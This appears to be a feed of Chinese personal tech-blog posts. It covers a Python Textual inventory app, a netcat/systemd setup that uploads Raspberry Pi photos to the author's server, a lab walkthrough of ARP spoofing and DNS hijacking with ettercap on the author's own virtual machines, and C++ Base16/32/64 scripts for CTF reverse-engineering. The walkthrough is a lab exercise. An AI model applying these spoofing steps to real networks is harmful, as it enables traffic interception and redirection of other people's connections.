show=False), 860 Binding(key=\u0026#34;CTRL+C\u0026#34;, action=\u0026#34;exit_program\u0026#34;, description=\u0026#34;Exit\u0026#34;, key_display=\u0026#34;^C\u0026#34;) 861 ] 862 863 @work 864 async def on_mount(self): 865 if getsize(\u0026#34;logininfo\u0026#34;) \u0026lt; 1: 866 if await self.push_screen_wait(LoginModalScreen(LoginStatus.FIRST_TIME_LOGIN)): 867 self.load_data() 868 else: 869 self.exit() 870 else: 871 if await self.push_screen_wait(LoginModalScreen(LoginStatus.REQUEST_LOGIN)): 872 self.load_data() 873 else: 874 self.exit() 875 876 def compose(self): 877 yield Header(show_clock=True) 878 yield Footer() 879 880 def action_new_item(self): 881 self.push_screen(ItemModalScreen(), self.new_item_callback) 882 883 def action_save_data(self): 884 data_dump = [(\u0026#34;Name\u0026#34;, \u0026#34;Unit Price\u0026#34;, \u0026#34;Quantity\u0026#34;, \u0026#34;Section\u0026#34;, \u0026#34;ID\u0026#34;)] + \\ 885 [(item.name, item.unit_price, item.quantity, item.section, item.id_number) for item in self.query(ItemWidget)] 886 try: 887 with open(\u0026#34;data.tsv\u0026#34;, \u0026#39;w\u0026#39;, newline=\u0026#34;\u0026#34;) as data: 888 writer = csv.writer(data, delimiter=\u0026#39;\\t\u0026#39;) 889 for row in data_dump: 890 writer.writerow(row) 891 self.push_screen(AlertModalScreen(\u0026#34;File saved!\u0026#34;)) 892 with open(\u0026#34;IMA.log\u0026#34;, \u0026#39;a\u0026#39;, newline=\u0026#34;\u0026#34;) as logfile: 893 logfile.write(f\u0026#34;Save data at {asctime()}\\n\u0026#34;) 894 895 except Exception: 896 self.push_screen(AlertModalScreen(\u0026#34;Failed to save data.\u0026#34;)) 897 898 @work(thread=True) 899 def load_data(self): 900 self.file_size = getsize(\u0026#34;ItemManagementApp.py\u0026#34;) 901 try: 902 data_load = [] 903 with open(\u0026#34;data.tsv\u0026#34;, \u0026#39;r\u0026#39;, newline=\u0026#34;\u0026#34;) as data: 904 reader = csv.reader(data, delimiter=\u0026#39;\\t\u0026#39;) 905 for row in reader: 906 data_load.append(row) 907 data_load = data_load[1:] 908 for name, unit_price, quantity, section, id_number in data_load: 909 item = ItemWidget() 910 item.name = name 911 item.unit_price = unit_price 912 item.quantity = quantity 913 item.section = section 914 item.id_number = id_number 915 self.call_from_thread(self.mount, item) 916 917 except Exception: 918 self.push_screen(AlertModalScreen(\u0026#34;Fialed to load data.\u0026#34;)) 919 920 def action_toggle_datatable_view(self): 921 data_dump = [(\u0026#34;Name\u0026#34;, \u0026#34;Unit Price\u0026#34;, \u0026#34;Quantity\u0026#34;, \u0026#34;Section\u0026#34;, \u0026#34;ID\u0026#34;)] + \\ 922 [(item.name, item.unit_price, item.quantity, item.section, item.id_number) for item in self.query(ItemWidget)] 923 self.push_screen(DataTableScreen(data_dump)) 924 925 def action_change_password(self): 926 self.push_screen(LoginModalScreen(LoginStatus.REQUEST_CHANGE_PASSWORD)) 927 928 def action_read_log_file(self): 929 self.push_screen(LogScreen()) 930 931 def action_credits(self): 932 self.push_screen(CreditsScreen()) 933 934 def action_toggle_light_dark_mode(self): 935 self.dark = not self.dark 936 937 def action_exit_program(self): 938 self.exit() 939 940 def new_item_callback(self, data): 941 item = ItemWidget() 942 name, unit_price, quantity, section, id_number = data 943 item.name = name 944 item.unit_price = unit_price 945 item.quantity = quantity 946 item.section = section 947 item.id_number = id_number 948 self.mount(item) 949 950 def edit_item_callback(self, item, data): 951 name, unit_price, quantity, section, id_number = data 952 item.name = name 953 item.unit_price = unit_price 954 item.quantity = quantity 955 item.section = section 956 item.id_number = id_number 957 958 def on_item_widget_edit(self, message): 959 self.push_screen(ItemModalScreen(), partial(self.edit_item_callback, message.item)) 960 961 def on_item_widget_delete(self, message): 962 message.item.remove() 963 964 def view_source_code(self): 965 self.push_screen(SourceCodeScreen(round(int(self.file_size) / 1024, 2))) 966 967 def visit_my_blog(self): 968 self.push_screen(GDNModalScreen()) 969 970 971class ExceptionApp(App): 972 973 COMMANDS = {ExceptionAppCommandProvider} 974 BINDINGS = [ 975 Binding(key=\u0026#39;d\u0026#39;, action=\u0026#34;toggle_light_dark_mode\u0026#34;, description=\u0026#34;Light/Dark Mode\u0026#34;, key_display=\u0026#39;D\u0026#39;), 976 Binding(key=\u0026#39;t\u0026#39;, action=\u0026#34;credits\u0026#34;, description=\u0026#34;Credits\u0026#34;, key_display=\u0026#34;T\u0026#34;), 977 Binding(key=\u0026#34;CTRL+C\u0026#34;, action=\u0026#34;exit_program\u0026#34;, description=\u0026#34;Exit\u0026#34;, key_display=\u0026#34;^C\u0026#34;), 978 Binding(key=\u0026#39;V\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, show=False), 979 Binding(key=\u0026#39;T\u0026#39;, action=\u0026#34;credits\u0026#34;, show=False) 980 ] 981 982 def on_mount(self): 983 self.file_size = getsize(\u0026#34;ItemManagementApp.py\u0026#34;) 984 self.push_screen(AlertModalScreen(\u0026#34;Failed to load data. Please check if you have permission.\u0026#34;)) 985 986 def compose(self): 987 yield Header(show_clock=True) 988 yield Footer() 989 990 def action_toggle_light_dark_mode(self): 991 self.dark = not self.dark 992 993 def action_credits(self): 994 self.push_screen(CreditsScreen()) 995 996 def action_exit_program(self): 997 self.exit() 998 999 def view_source_code(self): 1000 self.push_screen(SourceCodeScreen(round(int(self.file_size) / 1024, 2))) 1001 1002 def visit_my_blog(self): 1003 self.push_screen(GDNModalScreen()) 1004 1005 1006def main(): 1007 try: 1008 if not exists(\u0026#34;data.tsv\u0026#34;): 1009 with open(\u0026#34;data.tsv\u0026#34;, \u0026#39;a\u0026#39;, newline=\u0026#34;\u0026#34;) as _: 1010 pass 1011 chmod(\u0026#34;data.tsv\u0026#34;, 0o600) 1012 if not exists(\u0026#34;logininfo\u0026#34;): 1013 with open(\u0026#34;logininfo\u0026#34;, \u0026#39;a\u0026#39;, newline=\u0026#34;\u0026#34;) as _: 1014 pass 1015 chmod(\u0026#34;logininfo\u0026#34;, 0o600) 1016 if not exists(\u0026#34;IMA.log\u0026#34;): 1017 with open(\u0026#34;IMA.log\u0026#34;, \u0026#39;a\u0026#39;, newline=\u0026#34;\u0026#34;) as _: 1018 pass 1019 chmod(\u0026#34;IMA.log\u0026#34;, 0o600) 1020 chmod(\u0026#34;ItemManagementApp.py\u0026#34;, 0o644) 1021 app = ItemApp() 1022 app.title = \u0026#34;Item Management App\u0026#34; 1023 app.run() 1024 1025 except Exception: 1026 app = ExceptionApp() 1027 app.title = \u0026#34;Item Management App\u0026#34; 1028 app.sub_title = \u0026#34;Encountered Errors\u0026#34; 1029 app.run() 1030 1031 1032if __name__ == \u0026#39;__main__\u0026#39;: 1033 main() 代码解读 类 功能 LoginStatus 存储登录状态以及不同登录状态下 LoginModalScreen 显示内容的常量。 AlertModalScreen 显示弹窗，接收一个参数 alert_message 存储显示的消息。 ItemModalScreen 添加或修改商品信息的界面。 LoginModalScreen 注册、登录及修改密码共同使用的界面。显示的提示信息存储在 LoginStatus 类中。 DataTableScreen 将数据以表格视图显示，可以以不同列为依据对数据排序。 LogScreen 日志界面。 CreditsScreen 作者名单。 ItemWidget 在主界面展示商品信息的组件。 CommandProvider 存储命令托盘中的命令，允许用户搜索命令。 ExceptionAppCommandProvider ExceptionApp 下的命令托盘。 ItemApp 程序的主界面，调控整个程序运行的核心。 ExceptionApp 在程序缺少文件读写权限时运行，用于提醒用户权限不足并拒绝操作。 问题及未来改进 完善功能，尤其是数据处理方面的功能。作者在学习相应内容以及编写程序时时侧重于对该 TUI 模块的运用而非对数据的处理上，因此程序只有最基本的处理数据的功能，而更复杂的数据处理功能也因为时间问题和作者自身能力问题没有被实现。 界面及代码优化。由于作者能力有限以及 Textual 模块自身的不完善，有些代码显得格外冗余（例如 Binding() 的重复使用。在作者完成代码编写时，这样重复仍然是修改不同 Screen 中 Footer 组件所对应 BINDINGS 的唯一方法），也有些功能没有实现（例如作者曾尝试在登录失败时弹出一个 AlertModalScreen 但是 ModalScreen 类中并没有 push_screen() 方法；尝试使用回调函数实现的时候，ItemApp 类的 compose 方法定义为了一个异步方法，又由于作者对多线程编程了解甚少，最终的尝试也以失败告终）。未来作者希望通过学习消除这些遗憾。 增加多用户模式。目前程序只允许一位用户使用，在增加多用户模式会使程序的演示效果更强，这需要添加权限管理模块以及数据存储模式、日志记录模式和登录逻辑的全面重写。 添加自动保存功能。其实这个功能并不复杂，只需在用户每次执行完增加、修改、删除操作后将文件存储到一个 autosave 文件中去。但是这样做，日志的作用就会大大降低，并且在 ItemApp 类的异步方法 compose() 中重复调用 push_screen_wait() 方法会使程序出现意想不到的 bug（只有在将 compose() 方法声明为一个异步方法才能够调用 push_screen_wait() 方法，这些 bug 也许是因为作者对多线程的了解过于浅薄导致的）。 优化项目管理措施。就本项目来说，毕竟这是一项作业，将所有代码都放在一个脚本中无可厚非。但是在实际生产环境中，这样做有悖于模块化编程的原则，是一种极其愚蠢的做法：此行为不利于后期代码维护。当作者把代码写到 600 行左右（作者甚至把控制样式的 CSS 塞了进去，然而这完全没有必要，还会显得臃肿）时就已经感受到这个问题了，当作者需要添加或者修改某一个功能时，就要在文件中不停上下翻找。虽然 VSCode 可以拆分编辑器，但是为程序添加一个功能可能需要对多个模块进行修改（例如添加日志记录功能时，数据读写、登录等模块的代码都需要做出修改），依然会降低效率。这样做对于 debug 和程序出现问题后版本回溯也极不友好。 相关链接 Python3 Tetxual \u0026gt;\u0026gt; textual · PyPI Textual 文档 \u0026gt;\u0026gt; Textual Textual 讲解视频 \u0026gt;\u0026gt; Textualize - Youtube Pandoc \u0026gt;\u0026gt; Pandoc - index ","link":"https://jackgdn.github.io/post/python-%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/","section":"post","tags":["Python"],"title":"Python 课程设计项目报告"},{"body":"","link":"https://jackgdn.github.io/tags/linux/","section":"tags","tags":null,"title":"Linux"},{"body":"","link":"https://jackgdn.github.io/categories/linux/","section":"categories","tags":null,"title":"Linux"},{"body":"前段时间 wanqian 师傅添置了一台树莓派作为服务器连接到实验室的内网网络环境中。这台树莓派上安装了 Ubuntu 操作系统并装有一个摄像头模块，可以使用 fswebcam 命令控制摄像头拍照。不过遗憾的是，树莓派上没有图形化界面，如果想要查看图片就必须将图片传输到其他设备上；树莓派上的相机模块是反的，要是想正常查看需要将图片旋转 180°；树莓派在一个内网环境中，如果我想在宿舍里连接树莓派则需要每天交 1 元钱网费。\n拍照、旋转、上传 wanqian 师傅出于安全性的考虑，不希望我使用内网穿透控制树莓派拍照。所以，我只能让树莓派与我的云服务器单线联系。因此我想到让树莓派检测云服务器上的某个端口是否开放，若开放则自动执行拍照上传等一系列命令，所以有了下面一个脚本（路径为 /home/gdn/gwc/agwc.sh。下文为便于叙述，树莓派用 R 表示，云服务器用 S 表示，个人计算机用 PC 表示）:\n1#!/bin/bash 2CONN=\u0026#39;nc -zv IP_S 8963\u0026#39; 3while true 4do 5 if $CONN ; then 6 time=$(date +\u0026#34;%Y-%m-%d_%H-%M-%S\u0026#34;) 7 fswebcam --no-banner -r 1920x1080 /home/gdn/gwc/fagwc/$time.jpg 8 convert /home/gdn/gwc/fagwc/$time.jpg -rotate 180 /home/gdn/gwc/fagwc/$time.jpg 9 nc -v IP_S 8965 \u0026lt; /home/gdn/gwc/fagwc/$time.jpg 10 fi 11 sleep 10 12done 该脚本在 R 上运行，每隔十秒钟就会检测一次 S 的 8963 端口是否开放，如果开放，则使用 fswebcam 命令拍照，使用 convert 命令（在 ImageMagisk 工具集中）旋转图片并将图片使用 netcat 传输到 S 的 8965 端口上去。由于 netcat 连接特性，开放两个端口是必需的。另外，#! 的shebang 不能缺失，因为如果我们想将它写入 .service 文件自动运行，shebang 可以告诉计算机执行该脚本的解释器是什么。\n利用 systemd 自动执行 下面的服务文件（路径为 /etc/systemd/system/agwc.service）用于自动执行该脚本：\n1[Unit] 2Description=Autonomous Gideon-watching Client 3After=NetworkManager.service 4 5[Service] 6ExecStart=/home/gdn/gwc/agwc.sh 7 8[Install] 9WantedBy=multi-user.target 有了这个脚本，前面的 agwc.sh 就会在开机后自动运行。只需执行 sudo systemctl daemon-reload 与 sudo systemctl enable agwc.service，在下次树莓派开机时，这个服务就可以自动运行了。\n配置服务器接受图片 下面需要配置服务端，需要让 S 能在我需要的时候开放端口，接收图片然后关闭端口。下面这一脚本的路径为 /home/USER_S/gdnwatch.sh\n1sudo firewall-cmd --zone=public --add-port=8963/tcp --permanent 2sudo firewall-cmd --zone=public --add-port=8965/tcp --permanent 3sudo firewall-cmd --reload 4time=$(date +\u0026#34;%Y-%m-%d_%H-%M-%S\u0026#34;) 5nc -vl 8963 \u0026amp; 6nc -vl 8965 \u0026gt; ~/pictures/$time.jpg \u0026amp; 7sleep 10 8ps aux | grep \u0026#39;nc -vl 8963\u0026#39; | grep -v grep | awk \u0026#39;{print $2}\u0026#39; | xargs kill -9 9ps aux | grep \u0026#39;nc -vl 8965\u0026#39; | grep -v grep | awk \u0026#39;{print $2}\u0026#39; | xargs kill -9 10sudo firewall-cmd --zone=public --remove-port=8963/tcp --permanent 11sudo firewall-cmd --zone=public --remove-port=8965/tcp --permanent 12sudo firewall-cmd --reload 13find ./pictures/ -size -1b -exec rm {} \\; 这一脚本在 S 上运行。脚本首先将 8963 与 8965 端口打开并监听这两个端口并等待十秒，这两个端口分别用于标志和接受文件。接收到文件后，脚本会将两个 netcat 进程关闭以便于下次能够继续使用 netcat 监听这两个端口。再然后，关闭 8963 与 8965 两个端口。在某些情况下（例如 R 没有开机），S 接收不到任何信息并创建一个空文件，这时就需要将文件大小小于 1B 的图片删除。\n传输到个人计算机上浏览图片 进行到这一步，只剩下最后一个问题没有解决，就是浏览图片。S 上没有远程桌面，我不能在 S 上查看这些图片，我只能再将图片传输到 PC 上查看。因此，我们在 PC 上创建下面这个脚本（get-pictures.cmd，在 Linux 系统上将后缀改为 .sh 同样可以运行）：\n1ssh USER_S@IP_S \u0026#34;bash ~/gdnwatch.sh\u0026#34; 2sftp USER_S@IP_S:pictures/* C:\\Users\\jack_gdn\\Pictures\\Raspberry-Pi\\pictures\\ 3ssh USER_S@IP_S \u0026#34;find ~/pictures/ -name \u0026#39;*.*\u0026#39; -exec rm {} \\;\u0026#34; 这个脚本控制 S 运行 gdnwatch.sh 脚本，随后自动将图片传输回 PC，并且删除 S 上的图片缓存以节省存储空间。\n至此，我只需要在 PC 上运行 get-pictures.cmd 脚本就可以坐等图片传输回 PC 了。当然，既然使用了 SSH 与 SFTP，那么 ssh-genkey -t rsa 与 ssh-copy-id 实现免密码登录必不可少。上面这种远程拍照方式会使 S 每月额外消耗大约 170M 流量。\n","link":"https://jackgdn.github.io/post/nat/","section":"post","tags":["Linux"],"title":"远程控制一台在内网中的设备"},{"body":"","link":"https://jackgdn.github.io/tags/penetration/","section":"tags","tags":null,"title":"Penetration"},{"body":"前置知识 用较为生动的语言来讲，我们把网络类比成一间屋子，屋子里坐着的每一个人都是一台主机，每个人都有自己的编号（IP 地址）和位置（MAC 地址）。假如说屋子里的 A 需要和 B 通信，A 已知 B 的编号为 13 但是不知道 B 的位置，因此 A 无法和 B 通信。此时 A 会在屋子里大喊“谁的编号是 13”并等待 B 的回复。正常来说，除了 B 以外其他人会对 A 的请求视而不见，只有 B 收到 A 的请求后将自己的位置告诉 A，随后两人就可以开始通信。\n但是，这是出现了一个不怀好意的 C，当 A 发送请求的时候，C 就拼命地给 A 回复“我就是 13 号”以至于 A 根本听不到 B 给他的回复，因此 A 就会把 C 当作 B 并与之通信，C 便可以借机充当中间人实施攻击。\n动手尝试 攻击前准备 本次攻击尝试中，攻击机与靶机均为使用 NAT 模式连接物理机的虚拟机。这样既可以使两台虚拟机连接到外部网络，又不会在攻击过程中造成流量泄露。\n攻击机配置\n操作系统：Kali Linux IPv4 地址：192.168.107.135 MAC 地址：00:0c:29:62:a9:97 靶机配置\n操作系统：Windows 10 IPv4 地址：192.168.107.139 MAC 地址：00:0C:29:B6:7E:52 网关配置\nIPv4 地址：192.168.107.2 MAC 地址：00:50:56:f2:3a:1f 在开始攻击前，使用 arp -a 命令查看靶机 ARP 缓存中的 MAC 地址。此时，靶机中记录的 MAC 地址为正确的地址，测试用网址 example.com 也能够正常访问。\nARP 欺骗 在攻击机中使用 ettercap 工具，该工具可用于执行多种形式的中间人攻击，本次 ARP 欺骗以及 DNS 劫持都需要用到该工具。sudo ettercap -G 命令可用于打开该工具的图形化界面。\n首先扫描局域网下的存活主机，并将网关作为 Target 1, 靶机作为 Target 2：\n此时选择 ARP Poisoning 选项进行 ARP 欺骗攻击。这时再使用 arp -a 查看靶机上的 ARP 缓存就会发现，网关的 MAC 地址已经变成了攻击机的 MAC 地址。此时靶机再访问任何外界网站，流量都会首先通过攻击机。\nDNS 劫持 在进行 DNS 劫持中，ettercap 会将攻击机作为一台伪 DNS 解析服务器，向靶机发送虚假的服务器地址。首先修改 /etc/ettercap/etter.dns 文件来添加规则。例如说，我们在文件中添加一行 * A 127.0.0.1，则 ettercap 会对靶机发送的任何解析域名请求返回本机回环地址 127.0.0.1。\n修改好后，启用 ettercap 的 dns_spoof 插件进行 DNS 劫持攻击。\n这时就能发现，靶机断网了，因为任何通过域名访问外界的请求，都会被解析成 127.0.0.1。\n但是不经过域名解析，直接使用 IP 地址连接的服务器则不受影响。\n","link":"https://jackgdn.github.io/post/mitm-attack/","section":"post","tags":["Penetration"],"title":"记一次 ARP 欺骗 + DNS 劫持攻击的尝试"},{"body":"","link":"https://jackgdn.github.io/categories/%E6%B8%97%E9%80%8F/","section":"categories","tags":null,"title":"渗透"},{"body":"","link":"https://jackgdn.github.io/tags/c++/","section":"tags","tags":null,"title":"C++"},{"body":"","link":"https://jackgdn.github.io/tags/reverse/","section":"tags","tags":null,"title":"Reverse"},{"body":"","link":"https://jackgdn.github.io/categories/%E9%80%86%E5%90%91/","section":"categories","tags":null,"title":"逆向"},{"body":" Base16 [已完成] Base32 [已完成] Base64 UUencode XXencode [已完成] Base58 (Python 实现) [已完成] TEA XTEA [已完成] XXTEA [已完成] RC4 [已完成] RC5 [队列中] SM4 [队列中] AES [队列中] DES 3DES [队列中] Blowfish [队列中] Chacha20 [队列中] Rabbit [队列中] RSA [队列中] MD5 [队列中] SHA256 [队列中] CRC32 [队列中] 有一个 IDA 插件叫做 Findcrypt, 其工作原理是寻找“关键值”，例如 TEA 加密的 DELTA、AES 加密的 S 盒、MD5 算法的状态变量。出于安全性的原因，这些值在算法里都是被规定好不能更改的。但是万恶的出题人可不管这些，如果这些值被修改，Findcrypt 就不好用了。因此我打算做这个脚本库。\n除特别说明，本文中的脚本均使用 C++ 编写，使用 VC++ 编译器，以便于在遇到“魔改”算法题目时可直接修改。\n编码 Base16 实际上 Base16 编码就是将每个字符的十六进制打印出来。但是既然是一种编码，就要考虑在题目中变表的可能。\n编码脚本：\n1#include \u0026lt;iostream\u0026gt; 2#include \u0026lt;cstring\u0026gt; 3#include \u0026lt;sstream\u0026gt; 4 5using namespace std; 6 7string dec2hex(int deci) 8{ 9\tstringstream ss; 10\tss \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; deci; 11\treturn ss.str(); 12} 13 14int hex2dec_onebyte(char hexi) 15{ 16\tstringstream ss; 17\tss \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; hexi; 18\tint deci; 19\tss \u0026gt;\u0026gt; deci; 20\treturn deci; 21} 22 23int main() 24{ 25\tstring table = \u0026#34;0123456789ABCDEF\u0026#34;; // 编码表 26\tchar tmp0, tmp1; 27\tint index0, index1; 28\tstring cipher = \u0026#34;\u0026#34;; 29 30\tstring message; 31\tcin \u0026gt;\u0026gt; message; 32 33\tfor (int i = 0; i \u0026lt; strlen(data(message)); i++) 34\t{ 35\ttmp0 = dec2hex(int(message[i]))[0]; 36\ttmp1 = dec2hex(int(message[i]))[1]; 37\tindex0 = hex2dec_onebyte(tmp0); 38\tindex1 = hex2dec_onebyte(tmp1); 39\tcipher = cipher + table[index0] + table[index1]; 40\t} 41 42\tcout \u0026lt;\u0026lt; cipher; 43\treturn 0; 44} 解码脚本：\n1#include \u0026lt;iostream\u0026gt; 2#include \u0026lt;cstring\u0026gt; 3#include \u0026lt;sstream\u0026gt; 4 5using namespace std; 6 7char dec2chr(int hi4bits, int lo4bits) 8{ 9\treturn char((hi4bits \u0026lt;\u0026lt; 4) + lo4bits); 10} 11 12int main() 13{ 14\tstring table = \u0026#34;0123456789ABCDEF\u0026#34;; // 编码表 15\tint tmp0, tmp1; 16\tstring message = \u0026#34;\u0026#34;; 17 18\tstring cipher; 19\tcin \u0026gt;\u0026gt; cipher; 20 21\tfor (int i = 0; i \u0026lt; strlen(data(cipher)); i += 2) 22\t{ 23\ttmp0 = table.find(cipher[i]); 24\ttmp1 = table.find(cipher[i + 1]); 25\tmessage = message + dec2chr(tmp0, tmp1); 26\t} 27 28\tcout \u0026lt;\u0026lt; message; 29\treturn 0; 30} 特征：十六位编码表。\nBase32 1#include \u0026lt;iostream\u0026gt; 2#include \u0026lt;cstring\u0026gt; 3#include \u0026lt;bitset\u0026gt; 4#include \u0026lt;cmath\u0026gt; 5 6using namespace std; 7 8string paddingeq(string cipher, string binstr) 9{ 10\tint pad = (40 - (strlen(data(binstr)) % 40)) / 5; 11\tfor (int i = 0; i \u0026lt; pad; i++) 12\t{ 13\tcipher += \u0026#39;=\u0026#39;; 14\t} 15\treturn cipher; 16} 17 18string padding0(string binstr) 19{ 20\tint pad = 5 - (strlen(data(binstr)) % 5); 21\tfor (int i = 0; i \u0026lt; pad; i++) 22\t{ 23\tbinstr += \u0026#39;0\u0026#39;; 24\t} 25\treturn binstr; 26} 27 28string str2binstr(string message) 29{ 30\tstring binstr = \u0026#34;\u0026#34;; 31\tfor (auto i : message) 32\t{ 33\tbitset\u0026lt;8\u0026gt; bits(i); 34\tbinstr += bits.to_string(); 35\t} 36\treturn binstr; 37} 38 39int main() 40{ 41\tstring table = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567\u0026#34;; // 编码表 42\tstring binstr; 43\tstring cipher = \u0026#34;\u0026#34;; 44\tint index; 45 46\tstring message; 47\tcin \u0026gt;\u0026gt; message; 48 49\tbinstr = str2binstr(message); // 转为二进制字符串 50\tif (strlen(data(binstr)) % 5 != 0) // 填充 0 51\t{ 52\tbinstr = padding0(binstr); 53\t} 54 55\tfor (int i = 0; i \u0026lt; strlen(data(binstr)); i += 5) 56\t{ 57\tindex = 0; 58\tfor (int j = 0; j \u0026lt; 5; j++) 59\t{ 60\tif (binstr[i + j] == \u0026#39;1\u0026#39;) 61\t{ 62\tindex += pow(2, 4 - j); 63\t} 64\t} 65\tcipher += table[index]; 66\t} 67 68\tif (strlen(data(cipher)) % 8 != 0) // 填充等号 69\t{ 70\tcipher = paddingeq(cipher, binstr); 71\t} 72\tcout \u0026lt;\u0026lt; cipher; 73\treturn 0; 74} 解码脚本：\n1#include \u0026lt;iostream\u0026gt; 2#include \u0026lt;cstring\u0026gt; 3#include \u0026lt;bitset\u0026gt; 4#include \u0026lt;cmath\u0026gt; 5 6using namespace std; 7 8string dec2bin(int deci) 9{ 10\tbitset\u0026lt;5\u0026gt; bina(deci); 11\treturn bina.to_string(); 12} 13 14int main() 15{ 16\tstring table = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567\u0026#34;; 17\tstring binstr = \u0026#34;\u0026#34;; 18\tstring tmp; 19\tint index; 20\tint tmpbyte; 21\tstring message = \u0026#34;\u0026#34;; 22 23\tstring cipher; 24\tcin \u0026gt;\u0026gt; cipher; 25 26\tfor (auto i : cipher) // 去除等号 27\t{ 28\tif (i == \u0026#39;=\u0026#39;) 29\t{ 30\tbreak; 31\t} 32\telse 33\t{ 34\tindex = table.find(i); 35\tbinstr += dec2bin(index); 36\t} 37\t} 38 39\tint rest = strlen(data(binstr)) % 8; // 忽略用于填充的 0 40\t41\tfor (int i = 0; i \u0026lt; strlen(data(binstr)) - rest; i += 8) 42\t{ 43\ttmpbyte = 0; 44\ttmp = binstr.substr(i, 8); // 以每组 8 bits 截取 45\tfor (int j = 0; j \u0026lt; 8; j++) 46\t{ 47\tif (tmp[j] == \u0026#39;1\u0026#39;) 48\t{ 49\ttmpbyte += pow(2, 7 - j); 50\t} 51\t} 52\tmessage += char(tmpbyte); 53\t} 54 55\tcout \u0026lt;\u0026lt; message; 56\treturn 0; 57} 特征：32 位编码表，最后可能出现多个填充字符，填充字符不超过 6 个。\nBase64 Uuencode XXencode 编码脚本：\n1#include \u0026lt;iostream\u0026gt; 2 3using namespace std; 4 5string encode_main(string message) 6{ 7\tstring cipher = \u0026#34;\u0026#34;; 8\tstring table = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34;; 9\tfor (int i = 0; i \u0026lt; strlen(data(message)); i += 3) 10\t{ 11\tcipher += table[(int(message[i]) \u0026gt;\u0026gt; 2) \u0026amp; 0b111111]; 12\tcipher += table[((int(message[i]) \u0026lt;\u0026lt; 4) \u0026amp; 0b110000) | (int((message[i + 1]) \u0026gt;\u0026gt; 4) \u0026amp; 0b1111)]; 13\tcipher += table[((int(message[i + 1]) \u0026lt;\u0026lt; 2) \u0026amp; 0b111100) | (int(message[i + 2]) \u0026gt;\u0026gt; 6)\u0026amp;0b11]; 14\tcipher += table[(int(message[i + 2])) \u0026amp; 0b111111]; 15\t} 16\treturn cipher; 17} 18 19string encode_sub(string message) 20{ 21\tint len = strlen(data(message)); // 剩余字符串长度 22\tstring cipher = \u0026#34;\u0026#34;; 23\tstring table = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34;; 24 25\tswitch (len) 26\t{ 27\tcase 1: 28\tcipher += table[(int(message[0]) \u0026gt;\u0026gt; 2) \u0026amp; 0b111111]; 29\tcipher += table[(int(message[0]) \u0026lt;\u0026lt; 4) \u0026amp; 0b110000]; 30\tcipher += \u0026#34;==\u0026#34;; 31\tbreak; 32\tcase 2: 33\tcipher += table[(int(message[0]) \u0026gt;\u0026gt; 2) \u0026amp; 0b111111]; 34\tcipher += table[((int(message[0]) \u0026lt;\u0026lt; 4) \u0026amp; 0b110000) | (int((message[1]) \u0026gt;\u0026gt; 4) \u0026amp; 0b1111)]; 35\tcipher += table[(int(message[1]) \u0026lt;\u0026lt; 2) \u0026amp; 0b111100]; 36\tcipher += \u0026#39;=\u0026#39;; 37\tbreak; 38\tdefault: 39\tbreak; 40\t} 41 42\treturn cipher; 43} 44 45int main() 46{ 47\tstring message; 48\tcin \u0026gt;\u0026gt; message; 49 50\tint mainstrlen = strlen(data(message)) - (strlen(data(message)) % 3); // 去除需要填充部分 51\tstring mainstr = message.substr(0, mainstrlen); 52\tstring cipher0 = encode_main(mainstr); // 满三字节的部分进行编码 53\t54\tstring substrg = message.substr(mainstrlen); 55\tstring cipher1 = encode_sub(substrg); // 填充等号 56 57\tstring cipher = cipher0 + cipher1; 58\tcout \u0026lt;\u0026lt; cipher; 59\treturn 0; 60} XXencode 本质上是一种变表 Base64，其编码表为 +-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz 且无需填充字符。 UUencode 的算法与 Base64 有细微差异，但在实现后也是一种 Base64 变表算法，其编码表为 !\u0026quot;#$%\u0026amp;'()*+,-./0123456789:;\u0026lt;=\u0026gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_，也无需填充字符。 Base32 也可以像 Base64 一样通过判断编码后的长度填充等号，不过那样需要做多次判断；Base64 也可以像本文中 Base32 编码的脚本一样通过模运算判断需要填充等号的数量。两种方法对比学习。\n解码脚本：\n1#include \u0026lt;iostream\u0026gt; 2#include \u0026lt;bitset\u0026gt; 3 4using namespace std; 5 6string dec2bin(int deci) 7{ 8\tbitset\u0026lt;6\u0026gt; bina(deci); 9\treturn bina.to_string(); 10} 11 12int main() 13{ 14\tstring binstr = \u0026#34;\u0026#34;; 15\tstring table = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34;; 16\tstring tmp; 17\tint index; 18\tint tmpbyte; 19\tstring message = \u0026#34;\u0026#34;; 20 21\tstring cipher; 22\tcin \u0026gt;\u0026gt; cipher; 23 24\tfor (auto i : cipher) 25\t{ 26\tif (i == \u0026#39;=\u0026#39;) // 去除补位等号 27\t{ 28\tbreak; 29\t} 30\telse 31\t{ 32\tindex = table.find(i); 33\tbinstr += dec2bin(index); 34\t} 35\t} 36 37\tint rest = strlen(data(binstr)) % 8; // 忽略用于填充的 0 38 39\tfor (int i = 0; i \u0026lt; strlen(data(binstr)) - rest; i += 8) 40\t{ 41\ttmpbyte = 0; 42\ttmp = binstr.substr(i, 8); // 以每组 8 bits 截取 43\tfor (int j = 0; j \u0026lt; 8; j++) 44\t{ 45\tif (tmp[j] == \u0026#39;1\u0026#39;) 46\t{ 47\ttmpbyte += pow(2, 7 - j); 48\t} 49\t} 50\tmessage += char(tmpbyte); 51\t} 52 53\tcout \u0026lt;\u0026lt; message; 54\treturn 0; 55} 这个解码脚本和 Base32 的解码脚本几乎一样，唯一区别就在 dec2bin() 函数中将 Base32 的 5 bits 一截变成 6 bits 一截。\n特征：编码表长为 64，有形如 cipher += table[((int(message[0]) \u0026lt;\u0026lt; 4) \u0026amp; 0b110000) | (int((message[1]) \u0026gt;\u0026gt; 4) \u0026amp; 0b1111)]; 这样对单个字节进行左右位移操作（需要与一些数字做按位与运算以确保只保留需要的 bits）并且最终得到长度为 6 bits 的数据。\nBase58 Base58 编码的本质是将字符串 